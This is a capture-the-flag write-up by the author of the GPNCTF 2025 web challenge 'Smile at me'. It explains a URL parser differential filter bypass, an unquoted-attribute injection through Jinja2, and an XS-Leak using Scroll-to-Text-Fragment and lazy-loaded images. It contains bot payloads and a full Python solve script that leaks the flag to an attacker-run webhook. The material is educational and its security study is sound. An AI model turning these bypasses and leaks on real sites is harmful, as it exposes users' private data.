---
ctf: GPNCTF
title: Smile at me
authors:
    - name: vurlo
      url: /about
description: Be careful, others might be able to find out your most sacred secrets! (Flag only consists of emojis surrounded by 'GPNCTF{...}') The remote instance is not deployed via Docker-compose but plain Docker, resulting in the bot URL to be 'localhost:3000' instead of 'bot_service:3000' and the challenge server being 'localhost:9222' instead of 'challenge_service:9222'.
categories:
    - web
difficulty: Hard
ctf_year: 2025
event_url: https://gpn23.ctf.kitctf.de/
challengefiles: smile-at-me
solves: 1
points: 500
published: "2025-08-21"
optional:
    authored_challenge:
        event: GPNCTF 2025
        summary: Web challenge about URL parser differentials, strict CSP, and an XS-Leak using Scroll-to-Text Fragment behavior with lazy-loaded images. Published for GPNCTF 2025.
---

# TL;DR

- **Challenge Setup:** The bot has a restricted URL filter and the site enforces a strict **CSP** preventing XSS and CSS exfiltration
- **Key Discoveries:** The URL parser of **Python** and **NodeJS** (Puppeteer) are differing in their implementation
- **Vulnerability:** There are some URL parser differentials allowing you to bypass the checks and you can inject arbitrary image attributes in your notes
- **Exploitation:** We can leverage the image attribute injection to an **XSLeak** via **STTF**

# Introduction

I'm the author of this challenge. If you read this and had a look at this challenge, I hope you had some fun and learned new things about URL parsing and **XSLeaks**!
</br>
The challenge deploys a web app which is all about creating personal notes which are public to everyone if you know the UUID of the note.

![overview](ctf/writeups/gpnctf/smileatme/create_note.png "overview")

You can even add emojis to your notes - how awesome! There is a bot simulating another user you can share URLs with. However, it seems like contacting the bot is very restricted. The bot only wants to visit `example.com`. Initially, the bot will create its own note with the flag as the title and content. Then it will just visit the URL provided by you.

Overall there are two major problems to solve in this challenge:
&nbsp;&nbsp; - finding a way to bypass the `example.com` filter
&nbsp;&nbsp; - extracting the flag without **CSS** and **JavaScript** as the **CSP** is quite strict

# Reconnaissance

Having a look into the source code of the challenge we find out the bot can't be contacted directly as the port of the container in which the bot is running is not exposed. We can only contact it indirectly via the `/bot` endpoint of the **Flask** server. However, this endpoint implements a filter that only allows you to send URLs to the bot with the host `example.com` by implementing a check with the **Python urlparse** module. The bot itself is implemented as an **express** server waiting for requests to the `/bot` endpoint. With the very first request, the bot will log in and add a note to its account. Eventually, it will visit the website via the provided URL. The goal is to extract the flag out of the note title or body which was created by the bot.

# Vulnerability Description

The first vulnerability lies in how the **Python urllib** module parses URLs. **Python urlparse** doesn't follow the [WHATWG standard for URL parsing](https://url.spec.whatwg.org/#url-parsing). This is clear as you read the comments in the source code of [urllib parse](https://github.com/python/cpython/blob/3.12/Lib/urllib/parse.py#L22). However, the bot is based on **Puppeteer** and thus using the **NodeJS URL API** which uses a whole different URL parser [ada](https://github.com/ada-url/ada) conforming with the **WHATWG** standard. So for this challenge, we need to find a parser differential to bypass the filter. We have two options for this: We just fuzz the parser combination by checking which host will be eventually requested or we have a look into the source code and the [WHATWG standard for URL parsing](https://url.spec.whatwg.org/#url-parsing). Eventually, you will come up with the following differentials.

## Parser Differential #1

`\` is interpretated as `/` by the **NodeJS** URL parser (relative-slash-state rule) but the **Python urlparse** module doesn't implement this behaviour. So by using something like `http://webhook\@example.com` **Python urlparse** will use the `example.com` domain as a host, as it comes after the `@`. However, the **NodeJS** URL parser will interpret it as a `/` and everything following it will be thought of as the path of the URL. This will result in a whole different interpretation of the host of the provided URL.

## Parser Differential #2

`../` can be used as a path traversal and is resolved by the **NodeJS** URL parser but not by the **Python urlparse** module. For this challenge, this differential is important. When using the previously mentioned differential we will get something like `/@example.com` as a path. If this path is not served by the requested server, our differential would be completely useless. So by applying `/@example.com/../` the **NodeJS** parser will resolve the path traversal to `/`.

## Image Attribute Injection

So now that we can send the bot to arbitrary URLs with for example `http://webhook\@example.com/../` it is time to think about how to extract the flag. At some point inspecting the source code of the **Flask** application, you might step over one small detail. When creating a note we can also add an image URL which is used to render any image from the `imgur.com` host. However, this check can be bypassed with the same payload as for the bot filter. Rendering the image is done with the help of **Jinja2** which is used in **Python Flask** as a templating engine to inject dynamic content into the **HTML** template like the image URL. Additionally, **Jinja2** will escape any injected input. In this case, this is done with `<img src={{note.image_url}} alt="Your favorit Image">` so **Jinja2** will escape any image URL. However **Jinja2** only knows which file extension is used for rendering, which in this case is **HTML** for which **Jinja2** got special escaping rules. By default **Jinja2** will escape `"` to `&quot;` so you can't escape out of an attribute context if it is surrounded by `"`. In this case, the image `src` attribute is not surrounded by `"..."`. Escaping from this context is quite easy by using a space character. With this trick you are able to add arbitrary image attributes to the **HTML**. The reason why this works is that **Jinja2** is not context-aware. It can not detect whether it is used to inject nested **HTML** tags or attributes. However, breaking out of the image tag is not possible as `<` and `>` are also escaped by **Jinja2**.

## XSLeaking The Flag

So now we can add arbitrary attributes to the image tag. Sadly we won't be able to exploit **XSS** via an `onerror` event as the **CSP** is very strict and doesn't allow `inline` scripting. Using **CSS** also won't work as the **CSP** is here strict as well. We need to find another way to extract the flag. There is a neat class of techniques called **XSLeak**. A great resource to start with this topic is [XSLeakdev](https://xsleaks.dev/) which describes a variety of **XSLeak** techniques. One of them exploits a quite new feature in browsers called **Scroll-To-Text-Fragment**. Usually [Scroll-To-Text-Fragment](https://github.com/WICG/scroll-to-text-fragment) is used to automatically scroll to some specific part of a website matching the given URL fragment. This is, for example, used by search engines, linking directly to the part of the resource interesting to the user. The browser will scroll to this part after the website finishes loading. The generic syntax for **STTF** is `:~:text=[prefix-,]textStart[,textEnd][,-suffix]`. So, applied to our web challenge, you can add some text like `FLAG_NOT_FOUND` and let the bot visit your note with a fragment like `#:~:text=FLAG_NOT_FOUND` so the bot will automatically scroll to the place where this string is found first on the web page. However, there is one detail about this feature making it quite hard to exploit **STTF XSLeaks**. Only full words will be matched, no partial words are allowed. In most of the challenges which are about **STTF** vulnerabilities, the website applies `span` elements to the content, so it is possible to brute force the flag char by char. Without this modification, you could only match whole words and not parts of the text, making a char-by-char brute force attack almost impossible. But if you closely read the description of this challenge, it hints the flag only consists of emojis. This is where it gets interesting. Most special characters can be matched via **STTF** as a single character. This also applies to emojis and other special characters, such as Chinese characters, which carry meaning on their own.
</br>
Now this is where it gets interesting. We can make the bot scroll around on any website we want. Either to a part of the flag or to other content on the page. So we need to find a way to distinguish correct characters from wrong ones. This is where `lazy loading images` come into play. The [lazy loading](https://developer.mozilla.org/de/docs/Web/Performance/Guides/Lazy_loading) attribute makes elements only load their source when they get near the viewport of your browser. One of the characteristics of **STTF** is that only the leftmost successfully matched directive will be scrolled to. So we can have two `text` directives in our fragment and thus have a payload like `#:~:text=GPNCTF{🤔&text=FLAG_NOT_FOUND`. So when our image source is requested we know the brute forced character is wrong. However, if the image source is not requested this means our guess was correct and we found a valid character of the flag.

# Exploitation

So now that we found all of the vulnerabilities we just have to put them together to a final exploit. To make the bot request arbitrary URLs we just exploit the payload for the URL parser differential and exfiltrate the flag char by char using **STTF** with a `lazy loading image`. For this, we need to add enough content to the note so the image is not right in the viewport when visiting the note. So, for now, our payload for the bot is as follows:

```ruby
/bot?url=http://challenge_service:9222\@example.com/../note/<note-id>%23:~:text=GPNCTF{🤔%26text=FLAG_NOT_FOUND
```

Notice that we have to URL encode the `#` of the **STTF** as otherwise it will be consumed by the **POST** request of the **Flask** server to the bot **express** server. But there is still one detail to consider. The list of emojis you can select when creating a note is quite large. Brute forcing the flag char by char, emoji by emoji will take far too long. We need to optimize our approach even more. We can group the emojis and just do a binary search:

```ruby
/bot?url=http://challenge_service:9222\@example.com/../note/<note-id>%23:~:text=GPNCTF{🤔%26text=GPNCTF{🏃%26text=GPNCTF{🍬...%26text=GPNCTF{💹%26text=FLAG_NOT_FOUND
```

Now that we have our payload we just need to go char by char with the binary search and dynamically create the next payload depending on the image sending a request to our webhook or not. For this, we just need a webhook dynamically reacting to incoming requests from the bot. This can be easily done with [Tailscale funnel](https://tailscale.com/kb/1223/funnel). Furthermore, we need to be careful with the docker setup as sending the bot to a local URL you have to use `challenge_service:9222` as the requested host while on the remote instance, you just have to use `localhost:9222` as already stated in the description.

# Mitigation

In general if you, for whatever reason, parse some (user) input more than one time, make sure the parsers behave the same and are implemented correctly. Second, always make sure to escape any user input correct and not only rely on the escaping of modules like **Jinja2** but also use your brain and use these tools correct.

# Solve script

```python
#!/usr/bin/env python3
import threading
from queue import Queue, Empty
import os
import re
import subprocess
import threading
import time
from flask import Flask
import requests
import sys

app = Flask(__name__)

# Tailscale setup
TAILSCALE_AUTH_KEY = os.environ.get("TAILSCALE_AUTH_KEY")
if not TAILSCALE_AUTH_KEY:
    raise RuntimeError("Please set TAILSCALE_AUTH_KEY as env var!")
LOCAL_PORT = 5000
FORWARD_PORT = 443
SERVER_UP_S = "Here we gooo!"

# Exploit setup
with open('../../src/server/emojis.txt', 'r', encoding='utf-8') as f:
    FLAG_CHARS = f.read() + "}"

hits = Queue()
BASE_URL = "http://localhost:9222"
CHALLENGE_DOCKER_BASE_URL = "http://challenge_service:9222"
if len(sys.argv) > 1:
    if sys.argv[1] == "REMOTE":
        BASE_URL = "https://portdale-of-hyper-extreme-dreams.gpn23.ctf.kitctf.de"
        CHALLENGE_DOCKER_BASE_URL = "http://localhost:9222"

TARGET_PATH = "side-channel"
BOT_ALLOWED_DOMAIN= "example.com"
NOTE_IMG_ALLOWED_DOMAIN = "imgur.com"
STTF = "#:~:text="
STTF_FOR_URL = "%23:~:text="
AND_FOR_URL = "%26text="
BOT_CONTACTED_SUCCESS = "Bot visited your url"
FLAG_NOT_FOUND = "FLAG_NOT_FOUND"


def tailscale_setup():
    funnel_cmd = [
        "sudo", "tailscale", "funnel",
        "--bg=true",
        f"--https={FORWARD_PORT}",
        f"localhost:{LOCAL_PORT}",
    ]
    output = subprocess.check_output(funnel_cmd, stderr=subprocess.STDOUT).decode()

    match = re.search(r"(https?://[^\s/]+)", output)
    if not match:
        raise RuntimeError(f"Funnel-URL nicht gefunden in:\n{output}")
    public_url = match.group(1)
    return public_url

def tailscale_down():
    subprocess.run([
        "sudo", "tailscale", "funnel",
        f"--https={FORWARD_PORT}",
        "off",
    ], check=True)

def check_server_reachable(published_url):
    try:
        response = requests.get(published_url)
        if SERVER_UP_S in response.text:
            print("[*] Server reachable")
            return True
        else:
            return False
    except requests.exceptions.RequestException as e:
        return False

def check_server_reachable_until_success(published_url, delay=10):
    while True:
        time.sleep(delay)
        if check_server_reachable(published_url):
            return True
        print(f"[-] Published server not reachable, retrying...")

def login(username):
    sess = requests.Session()

    login_url = f'{BASE_URL}/login'
    resp = sess.post(login_url, data={'username': username})
    if '/dashboard' not in resp.url:
        raise RuntimeError("Login nicht erfolgreich, Dashboard nicht erreicht")
    return sess

def create_note(sess, title, content, image_url):
    new_note_url = f'{BASE_URL}/note/new'
    note_data = {
        'title': title,
        'content': content,
        'image_url': image_url
    }
    resp2 = sess.post(new_note_url, data=note_data, allow_redirects=False)
    if resp2.status_code not in (302, 303):
        raise RuntimeError(f"Note-Anlegen fehlgeschlagen: {resp2.status_code}")

    location = resp2.headers.get('Location', '')
    m = re.match(r'/note/([0-9a-fA-F-]+)', location)
    if not m:
        raise RuntimeError(f"Unbekanntes Redirect-Ziel: {location}")
    note_id = m.group(1)

    return note_id

def contact_bot(note_id, sttf_payload):
    bot_url = f'{BASE_URL}/bot?url={CHALLENGE_DOCKER_BASE_URL}\\@{BOT_ALLOWED_DOMAIN}/../note/{note_id}{sttf_payload}'
    print(f"[*] Contacting bot with: {bot_url}")
    try:
        resp = requests.get(bot_url)
    except requests.exceptions.RequestException as e:
        print(f"Fehler beim Kontaktieren des Bots: {e}")
        return False
    return True

@app.route("/")
def index():
    return SERVER_UP_S

@app.route(f"/{TARGET_PATH}", strict_slashes=False)
def side_channel():
    hits.put("side-channel accessed")
    return "ok", 200

def exploit():
    flag_part = "GPNCTF{"
    sess = login("testuser")

    while not flag_part.endswith("}"):
        search = FLAG_CHARS
        while len(search) > 1:
            first = search[::2]
            second = search[1::2]

            content = "A\n" * 500 + " " + FLAG_NOT_FOUND
            note_id = create_note(
                sess,
                "Test Note",
                content,
                f"{webhook_url}\\{TARGET_PATH}\\@{NOTE_IMG_ALLOWED_DOMAIN}/../ loading=lazy"
            )
            sttf_payload = f"{STTF_FOR_URL}{flag_part}{(AND_FOR_URL + flag_part).join(first)}{AND_FOR_URL}{FLAG_NOT_FOUND}"
            print(f"[*] Created note with ID: {note_id} for emojis: {first}")
            success = False
            while not success:
                success = contact_bot(note_id, sttf_payload)
                if not success:
                    print(f"[!] Failed requesting bot - retrying...")
                    time.sleep(1)
            try:
                hit = hits.get(timeout=1)
                print(f"Received hit: {hit} so flag char is not in first half")
                search = second
            except Empty:
                print(f"No hit received so flag char is in first half")
                search = first
        flag_part += search[0]
        print(f"[*] Current flag part: {flag_part}")
    print(f"[*] Flag found: {flag_part}")

if __name__ == "__main__":
    print("Starting Tailscale Funnel...")
    webhook_url = tailscale_setup()
    server_thread = threading.Thread(
        target=app.run,
        kwargs={"host": "0.0.0.0", "port": LOCAL_PORT, "use_reloader": False},
        daemon=True
    )
    server_thread.start()
    print(f"[*] Webhook URL: {webhook_url} - checking if the server is reachable")
    check_server_reachable_until_success(webhook_url)

    exploit()

    print(f'Stopping Tailscale Funnel...')
    tailscale_down()
```

# Flag

GPNCTF{💻🧐🔍🌐🔑📂🛡️🤖🚨🏃🤣🎉}
